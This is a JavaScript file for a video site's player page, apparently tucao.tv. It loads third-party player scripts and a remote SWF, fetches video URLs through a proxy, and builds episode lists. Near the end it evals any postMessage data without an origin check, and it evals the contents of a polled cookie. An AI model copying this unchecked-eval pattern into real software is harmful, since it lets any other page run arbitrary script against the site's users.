$(function(){
    if("a"=="a"){
        created_html5();
    }else{
        created_flashplayer();
    }
});

function created_html5() {
    var voide=[];
    for(var i=0;i<2;i++){
        voide.push(document.querySelectorAll("#player_code li")[i].innerText);
        voide[i]=voide[i].replace(/\|/,"");
    }
    var dateto=Date.parse(new Date()).toString();
    dateto=dateto.substring(0,dateto.length-3);
    
    var link = document.createElement('link');
    link.setAttribute("href", "https://month-time.github.io/M_dplayer/demo/orther/M_dplayer.min.css");
    link.setAttribute("rel", "stylesheet");
    document.head.appendChild(link);
    link.onload=function(){console.log("css加载完毕")}
    var script = document.createElement('script');
    script.setAttribute("type", "text/javascript");
    script.src = "https://month-time.github.io/M_dplayer/demo/orther/M_dplayer.min.js";
    document.body.querySelector("#player").appendChild(script);
    script.onload = function () {
        var voide = [];
        for (var i = 0; i < 2; i++) {
            voide.push(document.querySelectorAll("#player_code li")[i].innerText);
            voide[i] = voide[i].replace(/\|/, "");
        }
        var dateto = Date.parse(new Date()).toString();
        dateto = dateto.substring(0, dateto.length - 3);
        $.ajax({
            type: 'get',
//            url:"http://api.tucao.tv/api/playurl",
            url: "http://api.moeccg.com/proxy_tucao?" + voide[0] + "&key=tucao.cc&r=" + dateto,
            success: function (result) {
                console.log(result);
                if (typeof (result) === "object") {
                    var urltree = document.createElement('abc').innerHTML = result;
                    var playurl = urltree.querySelector('url').innerHTML;
                    playurl = playurl.replace('<![CDATA[', '').replace(']]>', '');
                    var dp = new M_dplayer({
                        container: document.getElementById('player'),
                        video: {
                            url: playurl,
                        },
                        danmaku: {
                            id: voide[1]+'-0',
                            api: '/index.php',
                            token: 'demo',
                            user: 'test',
                            margin: {
                                bottom: '15%'
                            },
                            poster: '',
                            unlimited: true,
                            callback(results) {
                                console.log("弹幕装填成功");
                            }
                        },
                    });
                }
            },
        });
    }
}

function __GetCookie(cName)
{
	var theCookie = "" + document.cookie;
	var ind = theCookie.indexOf(cName);
	if (ind == - 1 || cName == "")
	return "";
	var ind1 = theCookie.indexOf(';', ind);
	if (ind1 == - 1)
	ind1 = theCookie.length;
	return unescape(theCookie.substring(ind + cName.length + 1, ind1));
}

function __SetCookie(name,value) {
	var Days = 365;
	var exp = new Date(); //new Date("December 31, 9998");
	exp.setTime(exp.getTime() + Days*24*60*60*1000);
	document.cookie = name + "="+ escape(value) +";expires="+ exp.toGMTString()+"; path=/; domain=.tucao.tv";
}

function onSWFSwitchState( state, isFullscreen ) {
	if(state == "wideScreen"){
		if($this.attr('pid').indexOf('qq')!=-1){
			$("#player iframe").attr("height","592");
		}else {
			$("#player embed").attr("height","592");
		}
	  $("#player").height(592);
	}else if(state == "normal"){
		if($this.attr('pid').indexOf('qq')!=-1){
			$("#player iframe").attr("height","492");
		}else {
			$("#player embed").attr("height","492");
		}
	  $("#player").height(492);
	}
}

function created_flashplayer(){
var a,b,x,s,i;
a=$('#player_code>li:first').html();
if(a.indexOf('**')) a=a.split('**');
else a[0]=a;if(a[a.length-1]=='')a.pop();
b=$('#video_part');
s='';
for(i in a){
ii=parseInt(i);
x=a[i].split('|');
if(!x[1])x[1]='未命名';
if(x[0])s+='<a href="#'+(ii+1)+'" pid="'+x[0]+'&cid='+$('#player_code>li:last').html()+'-'+i+'" mid="'+$('#player_code').attr('mid')+(ii+1)+'"><p><span>'+(ii+1)+'</span>'+x[1]+'</p></a>';
}
b.html('<div id="part_lists">'+s+'<div class="clear"></div></div>');
i=parseInt(location.href.substring(location.href.indexOf('#')+1));if(isNaN(i))i=0;else i-=1;

b.find('a').click(function(){
	var s;
	$this=$(this);$this.siblings('a').removeClass('now');$this.addClass('now');
	var rand = Math.random().toString(36).substr(2);
	var domains = ['.api.dogebridge.xyz'];
	var domain = domains[Math.floor(Math.random()* domains.length)];
	//s='<iframe height="492" width="964" src="http://www.tucao.tv/player.php?" scrolling="no" border="0" frameborder="no" framespacing="0"></iframe>';
	//if($this.attr('pid').indexOf('tudou')!=-1)
	s='<embed height="492" width="964" src="http://clientupdate.175pt.com/Protect/175Secure/file/MukioPlayerPlus.swf" type="application/x-shockwave-flash" quality="high" allowfullscreen="true" flashvars="." allowscriptaccess="always" AllowNetworking="all"></embed>';
	//if($this.attr('pid').indexOf('tudou')!=-1)s='<iframe height="492" width="964" src="http://101.201.208.222:86/player/MukioPlayerPlus.swf?" scrolling="no" border="0" frameborder="no" framespacing="0"></iframe>';
	s=s.replace(/(src=\"http.*?swf\?|flashvars=\").*?\"/ig,'$1'+$this.attr('pid')+'"');
	$('#player').html(s);
	if($this.attr('mid').substr(-2,1) == '_' && $this.attr('mid').substr(-1,1) == 1){
		$('#show_mini').val('http://www.tucao.tv/mini/'+$this.attr('mid').substr(0,$this.attr('mid').length -2)+'.swf');
	}else{
        $('#show_mini').val('http://www.tucao.tv/mini/'+$this.attr('mid')+'.swf');
	}
  //$('#show_code').val(s);
ii=$this.attr('href').substr($this.attr('href').indexOf('#')+1);if(ii=='')ii='1';
if($this.siblings('a').length)$('#title_part').html('['+ii+'/'+($this.siblings('a').length+1)+']');

if(location.href.indexOf('#')==-1&ii=='1')return false;
}).eq(i).click();
if(b.find('a').length<2)b.hide();else b.show();

if($('iframe[src^="https://"]').size()>0){
	if(window.postMessage){
		var onMessage=function(e){
			eval(e.data);
		};
		if(window.addEventListener){window.addEventListener("message",onMessage,false);}
		else if(window.attachEvent){window.attachEvent("onmessage",onMessage);}
	}else {
		setInterval(function(){
			if(evalCode=__GetCookie('__SS'))
			{__SetCookie('__SS','');eval(evalCode);}
		},1000);
	}
}

}
